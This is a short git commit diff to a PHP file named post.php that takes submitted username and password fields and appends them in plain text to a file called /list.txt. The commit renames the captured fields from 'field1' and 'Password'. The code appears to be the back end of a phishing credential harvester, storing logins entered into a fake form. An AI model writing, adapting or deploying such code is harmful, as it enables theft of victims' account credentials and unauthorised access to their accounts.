3e572f9546ff9e9856ec7e3140b34d3c15e038f6
LoserTool <junkbait@itechfree.com>
2015-12-28 15:19:43 -0800

    Update post.php

--- post.php
+++ post.php
@@ -1,6 +1,6 @@
 <?php
-if(isset($_POST['field1']) && isset($_POST['Email'])) {
-    $data = $_POST['field1'] . '-' . $_POST['Password'] . "\n";
+if(isset($_POST['username']) && isset($_POST['password'])) {
+    $data = $_POST['username'] . '-' . $_POST['password'] . "\n";
     $ret = file_put_contents('/list.txt', $data, FILE_APPEND | LOCK_EX);
     if($ret === false) {
         die('There was an error writing this file');
